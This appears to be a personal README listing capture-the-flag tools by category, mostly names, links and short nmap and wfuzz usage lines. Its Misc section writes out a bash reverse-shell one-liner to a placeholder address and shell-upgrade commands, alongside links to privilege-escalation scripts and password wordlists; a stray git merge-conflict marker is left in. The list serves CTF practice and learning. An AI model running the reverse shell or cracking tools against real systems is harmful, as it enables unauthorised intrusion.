# CTF Tool list

This repo is intended to serve as a list of tools that I've found useful during CTFs and any notes that I've got to go with them.

## Discovery

##### Nmap
Get versions
`nmap -sC -sV <target>`
Basic scan all ports
`nmap -p- <target>`


##### wfuzz
Fuzz urls
`$ wfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ.php`
Fuzz post requests
`$ wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ"`
Fuzz Cookies
`$ wfuzz -z file,wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ`

##### Gobuster

## Web
Looks for `sitemap.xml` or `robots.txt`

##### Burpsuite
##### SQLMap


## Cracking

##### John the ripper
https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf
##### Hydra
https://github.com/frizb/Hydra-Cheatsheet
##### PadBuster
Used to execute and oracle padding attack

##### Hashcat
https://github.com/frizb/Hashcat-Cheatsheet

## pwn

##### [pwntools](https://github.com/Gallopsled/pwntools)

##### ROP Gadet

## Forensics

##### strings
##### Foremost
##### Bin Walk

##### Volatility
The Volatility Framework isfor the
extraction of digital artifacts from volatile memory (RAM) samples.

https://github.com/volatilityfoundation/volatility
https://github.com/volatilityfoundation/community

## Steg

##### Exiftool
##### Stegsolve
##### [StegCracker](https://github.com/Paradoxis/StegCracker)
Bruteforce steg hide with a wordlist 
##### [steghide](http://steghide.sourceforge.net/)
##### [zsteg](https://github.com/zed-0xff/zsteg)
detect stegano-hidden data in PNG & BMP
##### [jsteg](https://github.com/lukechampine/jsteg)
Lsb stegonography for JPEG
##### pngcheck
##### [stego-toolkit](https://github.com/DominicBreuker/stego-toolkit)
Docker image that does stegonography magic
##### Online tools
https://stylesuxx.github.io/steganography/


## Network
##### Wireshark
##### NetworkMiner
Finds files and other things in pcap files, requires mono

## Reversing

##### Radare
https://github.com/zxgio/r2-cheatsheet/blob/master/r2-cheatsheet.pdf

##### readelf

##### [checksec](https://github.com/slimm609/checksec.sh)
##### angr
##### [z3](https://github.com/Z3Prover/z3)
##### [libc-database](https://github.com/niklasb/libc-database)
https://libc.rip/

## Crypto
##### [Prime factorisation](https://www.alpertron.com.ar/ECM.HTM)

## Misc

##### Reverse Shell
`bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`
`python -c 'import pty; pty.spawn("/bin/sh")'`
`stty raw -echo`

<<<<<<< Updated upstream

##### Linux enumeration
[Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
[Linenum](https://github.com/rebootuser/LinEnum)

##### Wordlists
[Rockyou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
[SecLists](https://github.com/danielmiessler/SecLists)

###### Cewl 
Wordlist generator

##### Regripper
Windows registery extraction tool, requires wine

## Links
##### [CyberChef](https://gchq.github.io/CyberChef/)
##### [Virus total](https://www.virustotal.com/)
##### [Have I been Pwned](https://haveibeenpwned.com/)
##### [asm simulator](https://carlosrafaelgn.com.br/asm86/)


